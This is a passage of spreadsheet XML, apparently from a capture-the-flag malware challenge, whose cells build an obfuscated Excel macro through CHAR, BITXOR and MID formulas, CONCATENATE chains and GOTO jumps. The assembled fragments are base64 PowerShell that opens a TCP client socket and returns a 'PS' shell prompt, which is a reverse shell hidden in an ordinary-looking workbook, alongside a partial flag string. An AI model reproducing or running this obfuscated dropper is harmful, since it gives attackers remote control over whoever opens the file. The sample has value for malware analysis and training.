      <c r="BU60" t="s">
        <v>565</v>
      </c>
      <c r="BY60" t="s">
        <v>566</v>
      </c>
      <c r="CI60" t="s">
        <v>567</v>
      </c>
      <c r="CL60" t="s">
        <v>568</v>
      </c>
      <c r="CM60" t="s">
        <v>569</v>
      </c>
      <c r="CY60" t="s">
        <v>570</v>
      </c>
    </row>
    <row r="61" spans="1:107" x14ac:dyDescent="0.3">
      <c r="H61" t="s">
        <v>571</v>
      </c>
      <c r="AC61" t="str">
        <f>CONCATENATE(CHAR(100),CHAR(119),CHAR(MOD(510,445)),CHAR(_xlfn.BITXOR(272,356)),CHAR(_xlfn.BITXOR(662,727)),CHAR(INT("69")),CHAR(56),CHAR(INT("65")),CHAR(89),CHAR(103),CHAR(66),MID("losqv",4,1),CHAR(_xlfn.BITXOR(459,394)),CHAR(MOD(450,379)),CHAR(85),CHAR(INT("65")),CHAR(_xlfn.BITXOR(253,164)))</f>
        <v>dwAtAE8AYgBqAGUAY</v>
      </c>
      <c r="AE61" t="b">
        <f bx="1">part15=$AE$60</f>
        <v>0</v>
      </c>
      <c r="BQ61" t="s">
        <v>572</v>
      </c>
      <c r="BS61" t="s">
        <v>573</v>
      </c>
      <c r="BX61" t="s">
        <v>574</v>
      </c>
      <c r="CH61" t="s">
        <v>575</v>
      </c>
      <c r="CV61" t="s">
        <v>576</v>
      </c>
      <c r="DA61" t="s">
        <v>577</v>
      </c>
      <c r="DC61" t="s">
        <v>578</v>
      </c>
    </row>
    <row r="62" spans="1:107" x14ac:dyDescent="0.3">
      <c r="P62" t="s">
        <v>579</v>
      </c>
      <c r="AC62" t="str">
        <f>CONCATENATE(CHAR(INT("119")),CHAR(_xlfn.BITXOR(704,642)),MID("hr0ga",3,1),CHAR(65),CHAR(_xlfn.BITXOR(70,5)),CHAR(_xlfn.BITXOR(991,926)),CHAR(_xlfn.BITXOR(655,718)),CHAR(_xlfn.BITXOR(581,528)),MID("iwmppyj",2,1),CHAR(INT("66")),MID("u5ckhs",2,1),MID("iAfe",2,1),MID("kyxyHhdw",5,1),MID("ixMlsy",3,1))</f>
        <v>wB0ACAAUwB5AHM</v>
      </c>
      <c r="AE62" t="str">
        <f>CONCATENATE(MID("balAyl",4,1),CHAR(71),CHAR(_xlfn.BITXOR(302,282)),CHAR(_xlfn.BITXOR(364,301)),MID("saZlp",3,1),CHAR(_xlfn.BITXOR(639,520)),CHAR(65),CHAR(103),CHAR(INT("65")),CHAR(_xlfn.BITXOR(384,451)),CHAR(107),CHAR(INT("65")),CHAR(79),CHAR(119),CHAR(65),CHAR(_xlfn.BITXOR(693,734)),MID("jgkyAshn",5,1))</f>
        <v>AG4AZwAgACkAOwAkA</v>
      </c>
      <c r="AJ62" t="s">
        <v>580</v>
      </c>
      <c r="AO62" t="s">
        <v>581</v>
      </c>
      <c r="BU62" t="s">
        <v>582</v>
      </c>
      <c r="BW62" t="s">
        <v>583</v>
      </c>
    </row>
    <row r="63" spans="1:107" x14ac:dyDescent="0.3">
      <c r="O63" t="s">
        <v>584</v>
      </c>
      <c r="W63" t="s">
        <v>585</v>
      </c>
      <c r="AC63" t="str">
        <f>CONCATENATE(CHAR(INT("65")),MID("dohfojcp",1,1),MID("cxAq",3,1),CHAR(INT("66")),CHAR(108),CHAR(_xlfn.BITXOR(464,401)),CHAR(MOD(333,262)),MID("0xhoy",1,1),MID("nqnAtw",4,1),CHAR(MOD(650,574)),MID("jgixkqg",2,1),CHAR(_xlfn.BITXOR(1002,936)),CHAR(_xlfn.BITXOR(381,306)))</f>
        <v>AdABlAG0ALgBO</v>
      </c>
      <c r="AE63" t="str">
        <f>CONCATENATE(CHAR(INT("72")),MID("zbMfbihze",3,1),CHAR(_xlfn.BITXOR(361,296)),CHAR(INT("90")),CHAR(81),CHAR(_xlfn.BITXOR(282,344)),MID("rxixuj",5,1),CHAR(_xlfn.BITXOR(131,194)),CHAR(_xlfn.BITXOR(672,743)),MID("Qljjxw",1,1),CHAR(_xlfn.BITXOR(481,416)),CHAR(89),CHAR(_xlfn.BITXOR(743,640)),CHAR(INT("66")))</f>
        <v>HMAZQBuAGQAYgB</v>
      </c>
      <c r="AL63" t="s">
        <v>586</v>
      </c>
      <c r="AO63" t="s">
        <v>587</v>
      </c>
      <c r="AW63" t="s">
        <v>588</v>
      </c>
      <c r="BE63" t="s">
        <v>589</v>
      </c>
      <c r="BN63" t="s">
        <v>590</v>
      </c>
      <c r="BP63" t="s">
        <v>591</v>
      </c>
      <c r="BZ63" t="s">
        <v>592</v>
      </c>
      <c r="CE63" t="s">
        <v>593</v>
      </c>
      <c r="CF63" t="s">
        <v>594</v>
      </c>
      <c r="CQ63" t="s">
        <v>595</v>
      </c>
      <c r="CR63" t="s">
        <v>596</v>
      </c>
      <c r="CW63" t="s">
        <v>597</v>
      </c>
    </row>
    <row r="64" spans="1:107" x14ac:dyDescent="0.3">
      <c r="K64" t="s">
        <v>598</v>
      </c>
      <c r="AC64" t="str">
        <f>CONCATENATE($AC$61,$AC$62,$AC$63)</f>
        <v>dwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBO</v>
      </c>
      <c r="AE64" t="str">
        <f>CONCATENATE(CHAR(INT("104")),CHAR(MOD(210,145)),CHAR(MOD(335,264)),CHAR(77),CHAR(MOD(665,600)),CHAR(MOD(381,284)),MID("nporddlw",8,1),MID("wAfxeegy",2,1),CHAR(MOD(360,239)),MID("geagvAvg",6,1),CHAR(_xlfn.BITXOR(210,145)),MID("adcA",4,1),MID("gpjrzcA",7,1),CHAR(80),CHAR(_xlfn.BITXOR(852,773)))</f>
        <v>hAGMAawAyACAAPQ</v>
      </c>
      <c r="AF64" t="s">
        <v>599</v>
      </c>
      <c r="AN64" t="s">
        <v>600</v>
      </c>
      <c r="AU64" t="s">
        <v>601</v>
      </c>
      <c r="BH64" t="s">
        <v>602</v>
      </c>
      <c r="CE64" t="s">
        <v>603</v>
      </c>
      <c r="CI64" t="s">
        <v>604</v>
      </c>
    </row>
    <row r="65" spans="1:107" x14ac:dyDescent="0.3">
      <c r="B65" t="s">
        <v>605</v>
      </c>
      <c r="C65" t="s">
        <v>606</v>
      </c>
      <c r="T65" t="s">
        <v>607</v>
      </c>
      <c r="AC65" t="b">
        <f bx="1">part2=$AC$64</f>
        <v>0</v>
      </c>
      <c r="AE65" t="str">
        <f>CONCATENATE(CHAR(65),CHAR(MOD(443,340)),MID("lllowsAf",7,1),CHAR(_xlfn.BITXOR(559,620)),CHAR(_xlfn.BITXOR(1008,929)),CHAR(_xlfn.BITXOR(12,77)),CHAR(MOD(587,488)),CHAR(_xlfn.BITXOR(541,618)),CHAR(_xlfn.BITXOR(560,626)),CHAR(_xlfn.BITXOR(485,393)),CHAR(MOD(627,562)),CHAR(INT("71")),CHAR(MOD(229,177)),MID("qlpAt",4,1))</f>
        <v>AgACQAcwBlAG4A</v>
      </c>
      <c r="AW65" t="s">
        <v>608</v>
      </c>
      <c r="BI65" t="s">
        <v>609</v>
      </c>
      <c r="BP65" t="s">
        <v>610</v>
      </c>
      <c r="CA65" t="s">
        <v>611</v>
      </c>
      <c r="CQ65" t="s">
        <v>612</v>
      </c>
      <c r="DB65" t="s">
        <v>613</v>
      </c>
    </row>
    <row r="66" spans="1:107" x14ac:dyDescent="0.3">
      <c r="V66" t="s">
        <v>614</v>
      </c>
      <c r="Y66" t="s">
        <v>615</v>
      </c>
      <c r="AC66" t="str">
        <f>CONCATENATE(CHAR(INT("65")),MID("Gine",1,1),CHAR(_xlfn.BITXOR(53,96)),CHAR(MOD(642,577)),CHAR(MOD(694,594)),CHAR(MOD(185,120)),CHAR(INT("65")),CHAR(MOD(465,348)),CHAR(INT("65")),MID("qdypwF",6,1),MID("qvmmrgvM",8,1),CHAR(_xlfn.BITXOR(512,577)),MID("sjgimkbt",7,1),CHAR(MOD(378,259)),CHAR(66))</f>
        <v>AGUAdAAuAFMAbwB</v>
      </c>
      <c r="AE66" t="str">
        <f>CONCATENATE(CHAR(INT("90")),CHAR(65),MID("Boqrzlt",1,1),CHAR(_xlfn.BITXOR(128,233)))</f>
        <v>ZABi</v>
      </c>
      <c r="AF66" t="s">
        <v>616</v>
      </c>
      <c r="AH66" t="s">
        <v>617</v>
      </c>
      <c r="BA66" t="s">
        <v>618</v>
      </c>
      <c r="BD66" t="s">
        <v>619</v>
      </c>
      <c r="BM66" t="s">
        <v>620</v>
      </c>
      <c r="CG66" t="s">
        <v>621</v>
      </c>
      <c r="CN66" t="s">
        <v>622</v>
      </c>
      <c r="CU66" t="s">
        <v>623</v>
      </c>
    </row>
    <row r="67" spans="1:107" x14ac:dyDescent="0.3">
      <c r="D67" t="s">
        <v>624</v>
      </c>
      <c r="E67" t="s">
        <v>625</v>
      </c>
      <c r="AC67" t="str">
        <f>CONCATENATE(MID("fmjqbls",3,1),CHAR(INT("65")),CHAR(INT("71")),CHAR(INT("115")),CHAR(INT("65")),CHAR(INT("90")),CHAR(81),CHAR(_xlfn.BITXOR(277,343)),CHAR(_xlfn.BITXOR(281,297)),CHAR(_xlfn.BITXOR(932,997)),CHAR(_xlfn.BITXOR(928,1000)),MID("gumjyidM",8,1),CHAR(INT("65")),CHAR(76),CHAR(INT("103")))</f>
        <v>jAGsAZQB0AHMALg</v>
      </c>
      <c r="AE67" t="str">
        <f>CONCATENATE($AE$62,$AE$63,$AE$64,$AE$65,$AE$66)</f>
        <v>AG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABi</v>
      </c>
      <c r="AY67" t="s">
        <v>626</v>
      </c>
      <c r="BH67" t="s">
        <v>627</v>
      </c>
      <c r="BX67" t="s">
        <v>628</v>
      </c>
      <c r="CM67" t="s">
        <v>629</v>
      </c>
    </row>
    <row r="68" spans="1:107" x14ac:dyDescent="0.3">
      <c r="T68" t="s">
        <v>630</v>
      </c>
      <c r="AC68" t="str">
        <f>CONCATENATE(MID("mlBfi",3,1),CHAR(_xlfn.BITXOR(757,672)),MID("qxqvAuuyq",5,1),CHAR(69),CHAR(MOD(312,235)))</f>
        <v>BUAEM</v>
      </c>
      <c r="AE68" t="b">
        <f bx="1">part16=$AE$67</f>
        <v>0</v>
      </c>
      <c r="AG68" t="s">
        <v>631</v>
      </c>
      <c r="AK68" t="s">
        <v>632</v>
      </c>
      <c r="AY68" t="s">
        <v>633</v>
      </c>
      <c r="CD68" t="s">
        <v>634</v>
      </c>
      <c r="CF68" t="s">
        <v>635</v>
      </c>
      <c r="CS68" t="s">
        <v>636</v>
      </c>
    </row>
    <row r="69" spans="1:107" x14ac:dyDescent="0.3">
      <c r="D69" t="s">
        <v>637</v>
      </c>
      <c r="AC69" t="str">
        <f>CONCATENATE($AC$66,$AC$67,$AC$68)</f>
        <v>AGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEM</v>
      </c>
      <c r="AD69" t="s">
        <v>638</v>
      </c>
      <c r="AE69" t="str">
        <f>CONCATENATE(CHAR(65),CHAR(71),MID("lfpEeuijn",4,1),CHAR(INT("65")),CHAR(_xlfn.BITXOR(37,124)),CHAR(_xlfn.BITXOR(569,590)),CHAR(66),CHAR(114),CHAR(_xlfn.BITXOR(857,792)),CHAR(MOD(555,488)),CHAR(MOD(398,333)),CHAR(65),CHAR(_xlfn.BITXOR(239,164)),CHAR(119),CHAR(MOD(269,204)),CHAR(INT("103")))</f>
        <v>AGEAYwBrACAAKwAg</v>
      </c>
      <c r="AF69" t="s">
        <v>639</v>
      </c>
      <c r="AG69" t="s">
        <v>640</v>
      </c>
      <c r="BM69" t="s">
        <v>641</v>
      </c>
      <c r="BN69" t="s">
        <v>642</v>
      </c>
      <c r="CD69" t="s">
        <v>643</v>
      </c>
      <c r="CR69" t="s">
        <v>644</v>
      </c>
    </row>
    <row r="70" spans="1:107" x14ac:dyDescent="0.3">
      <c r="B70" t="s">
        <v>645</v>
      </c>
      <c r="C70" t="s">
        <v>646</v>
      </c>
      <c r="T70" t="s">
        <v>647</v>
      </c>
      <c r="W70" t="s">
        <v>648</v>
      </c>
      <c r="AA70" t="s">
        <v>649</v>
      </c>
      <c r="AC70" t="b">
        <f bx="1">part3=$AC$69</f>
        <v>0</v>
      </c>
      <c r="AE70" t="str">
        <f>CONCATENATE(CHAR(MOD(357,292)),MID("Cqwwyapd",1,1),CHAR(_xlfn.BITXOR(991,956)),CHAR(INT("65")),CHAR(INT("85")),CHAR(MOD(478,413)),CHAR(_xlfn.BITXOR(530,592)),CHAR(84),CHAR(_xlfn.BITXOR(280,345)),CHAR(67),CHAR(INT("65")),MID("tgmdAdi",5,1),CHAR(INT("74")),CHAR(_xlfn.BITXOR(407,480)),MID("dfegA",5,1))</f>
        <v>ACcAUABTACAAJwA</v>
      </c>
      <c r="AO70" t="s">
        <v>650</v>
      </c>
      <c r="BB70" t="s">
        <v>651</v>
      </c>
      <c r="BN70" t="s">
        <v>652</v>
      </c>
      <c r="BS70" t="s">
        <v>653</v>
      </c>
    </row>
    <row r="71" spans="1:107" x14ac:dyDescent="0.3">
      <c r="R71" t="s">
        <v>654</v>
      </c>
      <c r="AC71" t="b">
        <f>GOTO($BT$100)</f>
        <v>0</v>
      </c>
      <c r="AE71" t="str">
        <f>CONCATENATE(CHAR(MOD(379,276)),CHAR(MOD(459,394)),CHAR(INT("67")),CHAR(INT("115")),CHAR(INT("65")),CHAR(MOD(343,270)),MID("znzssAa",6,1),CHAR(MOD(233,168)),CHAR(MOD(435,324)),CHAR(65),CHAR(72),CHAR(INT("65")),CHAR(INT("65")),CHAR(MOD(594,494)),CHAR(MOD(707,588)),CHAR(66),CHAR(107))</f>
        <v>gACsAIAAoAHAAdwBk</v>
      </c>
      <c r="AF71" t="s">
        <v>655</v>
      </c>
      <c r="AO71" t="s">
        <v>656</v>
      </c>
      <c r="AQ71" t="s">
        <v>657</v>
      </c>
      <c r="BO71" t="s">
        <v>658</v>
      </c>
      <c r="BQ71" t="s">
        <v>659</v>
      </c>
      <c r="CK71" t="s">
        <v>660</v>
      </c>
      <c r="CP71" t="s">
        <v>661</v>
      </c>
      <c r="CV71" t="s">
        <v>662</v>
      </c>
    </row>
    <row r="72" spans="1:107" x14ac:dyDescent="0.3">
      <c r="AE72" t="str">
        <f>CONCATENATE(CHAR(INT("65")),CHAR(INT("67")),CHAR(MOD(304,197)),CHAR(65),CHAR(INT("76")))</f>
        <v>ACkAL</v>
      </c>
      <c r="AF72" t="s">
        <v>663</v>
      </c>
      <c r="AG72" t="s">
        <v>664</v>
      </c>
      <c r="AN72" t="s">
        <v>665</v>
      </c>
      <c r="AY72" t="s">
        <v>666</v>
      </c>
      <c r="BG72" t="s">
        <v>667</v>
      </c>
      <c r="BM72" t="s">
        <v>668</v>
      </c>
      <c r="BS72" t="s">
        <v>669</v>
      </c>
      <c r="BT72" t="s">
        <v>670</v>
      </c>
      <c r="CF72" t="s">
        <v>671</v>
      </c>
      <c r="CI72" t="s">
        <v>672</v>
      </c>
      <c r="CN72" t="s">
        <v>673</v>
      </c>
      <c r="DB72" t="s">
        <v>674</v>
      </c>
    </row>
    <row r="73" spans="1:107" x14ac:dyDescent="0.3">
      <c r="Y73" t="s">
        <v>675</v>
      </c>
      <c r="Z73" t="s">
        <v>676</v>
      </c>
      <c r="AE73" t="str">
        <f>CONCATENATE($AE$69,$AE$70,$AE$71,$AE$72)</f>
        <v>AGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkAL</v>
      </c>
      <c r="AF73" t="s">
        <v>677</v>
      </c>
      <c r="AM73" t="s">
        <v>678</v>
      </c>
      <c r="AR73" t="s">
        <v>679</v>
      </c>
      <c r="AW73" t="s">
        <v>680</v>
      </c>
      <c r="BQ73" t="s">
        <v>681</v>
      </c>
      <c r="CN73" t="s">
        <v>682</v>
      </c>
      <c r="DC73" t="s">
        <v>683</v>
      </c>
    </row>
    <row r="74" spans="1:107" x14ac:dyDescent="0.3">
      <c r="A74" t="s">
        <v>684</v>
      </c>
      <c r="D74" t="s">
        <v>685</v>
      </c>
      <c r="H74" t="s">
        <v>686</v>
      </c>
      <c r="I74" t="s">
        <v>687</v>
      </c>
      <c r="J74" t="s">
        <v>688</v>
      </c>
      <c r="P74" t="s">
        <v>689</v>
      </c>
      <c r="Z74" t="s">
        <v>690</v>
      </c>
      <c r="AB74" t="s">
        <v>691</v>
      </c>
      <c r="AE74" t="b">
        <f bx="1">part17=$AE$73</f>
        <v>0</v>
      </c>
      <c r="AP74" t="s">
        <v>692</v>
      </c>
      <c r="AV74" t="s">
        <v>693</v>
      </c>
      <c r="BD74" t="s">
        <v>694</v>
      </c>
      <c r="BK74" t="s">
        <v>695</v>
      </c>
      <c r="BO74" t="s">
        <v>696</v>
      </c>
      <c r="BV74" t="s">
        <v>697</v>
      </c>
      <c r="BY74" t="s">
        <v>698</v>
      </c>
      <c r="CI74" t="s">
        <v>699</v>
      </c>
      <c r="CY74" t="s">
        <v>700</v>
      </c>
    </row>
    <row r="75" spans="1:107" x14ac:dyDescent="0.3">
      <c r="B75" t="s">
        <v>701</v>
      </c>
      <c r="F75" t="s">
        <v>702</v>
      </c>
      <c r="L75" t="s">
        <v>703</v>
      </c>
      <c r="AE75" t="str">
        <f>CONCATENATE(CHAR(103),CHAR(66),MID("tbfapeuQo",8,1),CHAR(MOD(165,100)),CHAR(71),CHAR(MOD(202,133)),CHAR(MOD(240,175)),CHAR(INT("100")),CHAR(_xlfn.BITXOR(402,467)),MID("gnxBns",4,1),CHAR(INT("111")),CHAR(INT("65")),CHAR(67),CHAR(MOD(372,307)),MID("mhAfhli",3,1),MID("wKabq",2,1),CHAR(119))</f>
        <v>gBQAGEAdABoACAAKw</v>
      </c>
      <c r="AJ75" t="s">
        <v>704</v>
      </c>
      <c r="AK75" t="s">
        <v>705</v>
      </c>
      <c r="AR75" t="s">
        <v>706</v>
      </c>
      <c r="BA75" t="s">
        <v>707</v>
      </c>
      <c r="BB75" t="s">
        <v>708</v>
      </c>
      <c r="BC75" t="s">
        <v>709</v>
      </c>
    </row>
    <row r="76" spans="1:107" x14ac:dyDescent="0.3">
      <c r="G76" t="s">
        <v>710</v>
      </c>
      <c r="L76" t="s">
        <v>711</v>
      </c>
      <c r="V76" t="s">
        <v>712</v>
      </c>
      <c r="X76" t="s">
        <v>713</v>
      </c>
      <c r="AE76" t="str">
        <f>CONCATENATE(CHAR(_xlfn.BITXOR(117,52)),CHAR(MOD(265,162)),CHAR(MOD(511,446)),CHAR(INT("67")),CHAR(_xlfn.BITXOR(703,732)),CHAR(65),CHAR(80),CHAR(INT("103")),CHAR(INT("65")),CHAR(_xlfn.BITXOR(241,150)),MID("pAzeyry",2,1),CHAR(MOD(467,400)),CHAR(_xlfn.BITXOR(454,421)),CHAR(_xlfn.BITXOR(815,878)))</f>
        <v>AgACcAPgAgACcA</v>
      </c>
      <c r="AH76" t="s">
        <v>714</v>
      </c>
      <c r="AJ76" t="s">
        <v>715</v>
      </c>
      <c r="AU76" t="s">
        <v>716</v>
      </c>
      <c r="AV76" t="s">
        <v>717</v>
      </c>
      <c r="AY76" t="s">
        <v>718</v>
      </c>
      <c r="BO76" t="s">
        <v>719</v>
      </c>
      <c r="BQ76" t="s">
        <v>720</v>
      </c>
      <c r="CQ76" t="s">
        <v>721</v>
      </c>
    </row>
    <row r="77" spans="1:107" x14ac:dyDescent="0.3">
      <c r="T77" t="s">
        <v>722</v>
      </c>
      <c r="AE77" t="str">
        <f>CONCATENATE(CHAR(_xlfn.BITXOR(629,570)),CHAR(MOD(685,566)),CHAR(_xlfn.BITXOR(114,51)),CHAR(MOD(660,553)),CHAR(INT("65")),CHAR(INT("71")),CHAR(89),MID("ygAl",3,1),CHAR(_xlfn.BITXOR(383,285)),CHAR(MOD(136,71)),CHAR(INT("66")),CHAR(INT("104")),MID("eAxbwg",2,1),CHAR(MOD(615,544)),CHAR(99))</f>
        <v>OwAkAGYAbABhAGc</v>
      </c>
      <c r="AO77" t="s">
        <v>723</v>
      </c>
      <c r="AP77" t="s">
        <v>724</v>
      </c>
      <c r="AQ77" t="s">
        <v>725</v>
      </c>
      <c r="AR77" t="s">
        <v>726</v>
      </c>
      <c r="AX77" t="s">
        <v>727</v>
      </c>
      <c r="CT77" t="s">
        <v>728</v>
      </c>
      <c r="DB77" t="s">
        <v>729</v>
      </c>
    </row>
    <row r="78" spans="1:107" x14ac:dyDescent="0.3">
      <c r="H78" t="s">
        <v>730</v>
      </c>
      <c r="W78" t="s">
        <v>731</v>
      </c>
      <c r="AC78" t="s">
        <v>732</v>
      </c>
      <c r="AE78" t="str">
        <f>CONCATENATE(CHAR(INT("65")),CHAR(_xlfn.BITXOR(880,800)),CHAR(_xlfn.BITXOR(905,984)),CHAR(MOD(515,450)),CHAR(_xlfn.BITXOR(200,161)),CHAR(_xlfn.BITXOR(253,188)),CHAR(69),CHAR(INT("103")),CHAR(INT("65")),CHAR(INT("86")),CHAR(MOD(321,256)),MID("ekBmwe",3,1))</f>
        <v>APQAiAEgAVAB</v>
      </c>
      <c r="AK78" t="s">
        <v>733</v>
      </c>
      <c r="BI78" t="s">
        <v>734</v>
      </c>
      <c r="BW78" t="s">
        <v>735</v>
      </c>
      <c r="CK78" t="s">
        <v>736</v>
      </c>
      <c r="CO78" t="s">
        <v>737</v>
      </c>
      <c r="DC78" t="s">
        <v>738</v>
      </c>
    </row>
    <row r="79" spans="1:107" x14ac:dyDescent="0.3">
      <c r="P79" t="s">
        <v>739</v>
      </c>
      <c r="V79" t="s">
        <v>740</v>
      </c>
      <c r="Y79" t="s">
        <v>741</v>
      </c>
      <c r="AE79" t="str">
        <f>CONCATENATE($AE$75,$AE$76,$AE$77,$AE$78)</f>
        <v>gBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAGYAbABhAGcAPQAiAEgAVAB</v>
      </c>
      <c r="BD79" t="s">
        <v>742</v>
      </c>
      <c r="BS79" t="s">
        <v>743</v>
      </c>
      <c r="CG79" t="s">
        <v>744</v>
      </c>
      <c r="CU79" t="s">
        <v>745</v>
      </c>
      <c r="CV79" t="s">
        <v>746</v>
      </c>
    </row>
    <row r="80" spans="1:107" x14ac:dyDescent="0.3">
      <c r="N80" t="s">
        <v>747</v>
      </c>
      <c r="S80" t="s">
        <v>748</v>
      </c>
      <c r="AA80" t="s">
        <v>749</v>
      </c>
      <c r="AD80" t="s">
        <v>750</v>
      </c>
      <c r="AE80" t="b">
        <f bx="1">part18=$AE$79</f>
        <v>0</v>
      </c>
      <c r="AG80" t="s">
        <v>751</v>
      </c>
      <c r="AO80" t="s">
        <v>752</v>
      </c>
      <c r="BI80" t="s">
        <v>753</v>
      </c>
      <c r="BW80" t="s">
        <v>754</v>
      </c>
      <c r="BY80" t="s">
        <v>755</v>
      </c>
      <c r="CR80" t="s">
        <v>756</v>
      </c>
      <c r="DC80" t="s">
        <v>757</v>
      </c>
    </row>
    <row r="81" spans="1:106" x14ac:dyDescent="0.3">
      <c r="J81" t="s">
        <v>758</v>
      </c>
      <c r="S81" t="s">
        <v>759</v>
      </c>
      <c r="AD81" t="s">
        <v>760</v>
      </c>
      <c r="AE81" t="str">
        <f>CONCATENATE(CHAR(67),CHAR(65),CHAR(_xlfn.BITXOR(684,740)),CHAR(MOD(677,562)),CHAR(INT("65")),CHAR(_xlfn.BITXOR(476,402)),CHAR(MOD(230,165)),CHAR(INT("66")),MID("mdiauc",5,1),MID("mluzuA",6,1),CHAR(INT("70")),CHAR(56))</f>
        <v>CAHsANABuAF8</v>
      </c>
      <c r="AM81" t="s">
        <v>761</v>
      </c>
      <c r="BM81" t="s">
        <v>762</v>
      </c>
      <c r="BO81" t="s">
        <v>763</v>
      </c>
      <c r="CC81" t="s">
        <v>764</v>
      </c>
      <c r="CD81" t="s">
        <v>765</v>
      </c>
    </row>
    <row r="82" spans="1:106" x14ac:dyDescent="0.3">
      <c r="R82" t="s">
        <v>766</v>
      </c>
      <c r="AE82" t="str">
        <f>CONCATENATE($AE$81)</f>
        <v>CAHsANABuAF8</v>
      </c>
      <c r="AO82" t="s">
        <v>767</v>
      </c>
      <c r="CG82" t="s">
        <v>768</v>
      </c>
      <c r="CR82" t="s">
        <v>769</v>
      </c>
      <c r="CY82" t="s">
        <v>770</v>
      </c>
    </row>
    <row r="83" spans="1:106" x14ac:dyDescent="0.3">
      <c r="W83" t="s">
        <v>771</v>
      </c>
      <c r="X83" t="s">
        <v>772</v>
      </c>
      <c r="Z83" t="s">
        <v>773</v>
      </c>
      <c r="AE83" t="b">
        <f bx="1">part19=$AE$82</f>
        <v>0</v>
      </c>
      <c r="AU83" t="s">
        <v>774</v>
      </c>
      <c r="BS83" t="s">
        <v>775</v>
      </c>
      <c r="BX83" t="s">
        <v>776</v>
      </c>
      <c r="CB83" t="s">
        <v>777</v>
      </c>
    </row>
    <row r="84" spans="1:106" x14ac:dyDescent="0.3">
      <c r="D84" t="s">
        <v>778</v>
      </c>
      <c r="AC84" t="s">
        <v>779</v>
      </c>
      <c r="AE84" t="b">
        <f>GOTO($DC$99)</f>
        <v>0</v>
      </c>
      <c r="AT84" t="s">
        <v>780</v>
      </c>
      <c r="BS84" t="s">
        <v>781</v>
      </c>
      <c r="CS84" t="s">
        <v>782</v>
      </c>
      <c r="CT84" t="s">
        <v>783</v>
      </c>
      <c r="CV84" t="s">
        <v>784</v>
      </c>
    </row>
    <row r="85" spans="1:106" x14ac:dyDescent="0.3">
      <c r="G85" t="s">
        <v>785</v>
      </c>
      <c r="N85" t="s">
        <v>786</v>
      </c>
      <c r="U85" t="s">
        <v>787</v>
      </c>
      <c r="AE85" t="s">
        <v>788</v>
      </c>
      <c r="BM85" t="s">
        <v>789</v>
      </c>
      <c r="BX85" t="s">
        <v>790</v>
      </c>
      <c r="CM85" t="s">
        <v>791</v>
      </c>
      <c r="CQ85" t="s">
        <v>792</v>
      </c>
      <c r="DB85" t="s">
        <v>793</v>
      </c>
    </row>
    <row r="86" spans="1:106" x14ac:dyDescent="0.3">
      <c r="A86" t="s">
        <v>794</v>
      </c>
      <c r="E86" t="s">
        <v>795</v>
      </c>
      <c r="I86" t="s">
        <v>796</v>
      </c>
      <c r="AE86" t="s">
        <v>797</v>
      </c>
      <c r="AJ86" t="s">
        <v>798</v>
      </c>
      <c r="AW86" t="s">
        <v>799</v>
      </c>
      <c r="BL86" t="s">
        <v>800</v>
      </c>
      <c r="BQ86" t="s">
        <v>801</v>
      </c>
      <c r="BY86" t="s">
        <v>802</v>
      </c>
      <c r="CB86" t="s">
        <v>803</v>
      </c>
      <c r="CI86" t="s">
        <v>804</v>
      </c>
    </row>
    <row r="87" spans="1:106" x14ac:dyDescent="0.3">
      <c r="O87" t="s">
        <v>805</v>
      </c>
      <c r="AE87" t="s">
        <v>806</v>
      </c>
      <c r="AM87" t="s">
        <v>807</v>
      </c>
      <c r="AP87" t="s">
        <v>808</v>
      </c>
      <c r="AZ87" t="s">
        <v>809</v>
      </c>
      <c r="BK87" t="s">
        <v>810</v>
      </c>
      <c r="CB87" t="s">
        <v>811</v>
      </c>
      <c r="CG87" t="s">
        <v>812</v>
      </c>
      <c r="CQ87" t="s">
        <v>813</v>
      </c>
      <c r="DB87" t="s">
        <v>814</v>
      </c>
    </row>
    <row r="88" spans="1:106" x14ac:dyDescent="0.3">
      <c r="W88" t="s">
        <v>815</v>
      </c>
      <c r="AP88" t="s">
        <v>816</v>
      </c>
      <c r="AR88" t="s">
        <v>817</v>
      </c>
      <c r="AT88" t="s">
        <v>818</v>
      </c>
      <c r="AW88" t="s">
        <v>819</v>
      </c>
      <c r="BA88" t="s">
        <v>820</v>
      </c>
      <c r="BK88" t="s">
        <v>821</v>
      </c>
      <c r="CC88" t="s">
        <v>822</v>
      </c>
      <c r="CP88" t="s">
        <v>823</v>
      </c>
    </row>
    <row r="89" spans="1:106" x14ac:dyDescent="0.3">
      <c r="N89" t="s">
        <v>824</v>
      </c>
      <c r="V89" t="s">
        <v>825</v>
      </c>
      <c r="AJ89" t="s">
        <v>826</v>
      </c>
      <c r="AS89" t="s">
        <v>827</v>
      </c>
      <c r="BI89" t="s">
        <v>828</v>
      </c>
      <c r="BR89" t="s">
        <v>829</v>
      </c>
      <c r="BX89" t="s">
        <v>830</v>
      </c>
      <c r="CJ89" t="s">
        <v>831</v>
      </c>
      <c r="CN89" t="s">
        <v>832</v>
      </c>
      <c r="CS89" t="s">
        <v>833</v>
      </c>
    </row>
    <row r="90" spans="1:106" x14ac:dyDescent="0.3">
      <c r="F90" t="s">
        <v>834</v>
      </c>
      <c r="V90" t="s">
        <v>835</v>
      </c>
      <c r="X90" t="s">
        <v>836</v>
      </c>
      <c r="AC90" t="s">
        <v>837</v>
      </c>
      <c r="AK90" t="s">
        <v>838</v>
      </c>
      <c r="AR90" t="s">
        <v>839</v>
      </c>
      <c r="BR90" t="s">
        <v>840</v>
      </c>
      <c r="BU90" t="s">
        <v>841</v>
      </c>
      <c r="CS90" t="s">
        <v>842</v>
      </c>
    </row>
    <row r="91" spans="1:106" x14ac:dyDescent="0.3">
      <c r="M91" t="s">
        <v>843</v>
      </c>
      <c r="T91" t="s">
        <v>844</v>
      </c>
      <c r="V91" t="s">
        <v>845</v>
      </c>
      <c r="AD91" t="s">
        <v>846</v>
      </c>
      <c r="AI91" t="s">
        <v>847</v>
      </c>
      <c r="AQ91" t="s">
        <v>848</v>
      </c>
      <c r="BI91" t="s">
        <v>849</v>
      </c>
      <c r="CW91" t="s">
        <v>850</v>
      </c>
    </row>
    <row r="92" spans="1:106" x14ac:dyDescent="0.3">
      <c r="B92" t="s">
        <v>851</v>
      </c>
      <c r="E92" t="s">
        <v>852</v>
      </c>
      <c r="J92" t="s">
        <v>853</v>
